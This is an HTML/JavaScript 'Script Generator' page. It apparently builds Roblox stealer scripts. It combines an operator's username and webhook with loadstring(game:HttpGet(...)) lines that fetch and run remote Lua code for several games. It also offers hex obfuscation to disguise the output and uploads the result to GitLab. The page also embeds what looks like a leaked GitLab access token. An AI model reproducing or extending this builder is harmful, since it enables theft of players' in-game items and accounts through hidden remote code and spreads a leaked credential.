<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        h1 {
            font-size: 3rem;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input, select, button {
            padding: 10px;
            border-radius: 8px;
            border: none;
            background-color: #333;
            color: white;
            font-size: 1rem;
            width: 250px;
        }
        button {
            background: #ff0080;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div class="container">
        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
        <input type="text" id="webhook" placeholder="Enter Webhook URL">
        <input type="text" id="pat" placeholder="Enter GitLab PAT">
        <select id="script-select">
            <option value="Blox Fruits">Blox Fruits</option>
            <option value="Murder Mystery 2 (patched)">Murder Mystery 2</option>
            <option value="Adopt Me (Not tested)">Adopt Me</option>
            <option value="Pet Simulator 99">Pet Simulator 99</option>
            <option value="Pls Donate">Pls Donate</option>
        </select>
        <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
        <button onclick="generateScript()">Generate Script</button>
    </div>

    <script>
        // Loadstrings for different games
        let loadstrings = {
            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
        };

        // Hex obfuscation functions
        function hexEncode(script) {
            return script.split('').map((c) => {
                let hex = c.charCodeAt(0).toString(16);
                let rand = Math.floor(Math.random() * 9);
                return `\\z${hex}${rand}`;
            }).join('');
        }

        function wrapInDecoder(hexString) {
            return `loadstring((function()
                local hex = '${hexString}'
                local decoded = ''
                for h in hex:gmatch('\\\\z(%x%x)%d') do
                    decoded = decoded .. string.char(tonumber(h, 16))
                end
                return decoded
            end)())()`;
        }

        function obfuscateScript(script) {
            let hex = hexEncode(script);
            return wrapInDecoder(hex);
        }

        // Main generate script function
        function generateScript() {
            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;
            let pat = document.getElementById('pat').value;
            let selectedScript = document.getElementById('script-select').value;
            let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;

            if (!username || !webhook) {
                alert("Please enter both Username and Webhook URL!");
                return;
            }

            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;

            if (autoObfuscate) {
                script = obfuscateScript(script);
            }

            if (pat) {
                uploadToGitLab(script, selectedScript, pat);
            } else {
                downloadScript(script);
            }
        }

        // Download script locally
        function downloadScript(content) {
            let blob = new Blob([content], { type: "text/plain" });
            let a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "generated_script.txt";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        // GitLab Upload Function
        function uploadToGitLab(content, scriptName, pat) {
            let projectID = '67450323'; // Replace with your GitLab project ID
            let filename = `Void${scriptName}.lua`;

            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(projectID)}/repository/files/${encodeURIComponent(filename)}`, {
                method: 'POST',
                headers: {
                    'glpat-8si5orFgbXbJE4uzHwKS': pat,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    branch: 'main',
                    content: btoa(content),
                    commit_message: 'Add new script'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.file_path) {
                    alert("Script uploaded successfully to GitLab!");
                } else {
                    alert("Failed to upload. Check your PAT and project ID.");
                }
            })
            .catch(error => {
                console.error('Error uploading:', error);
                alert("Error uploading script! Check console for details.");
            });
        }
    </script>

</body>
</html>
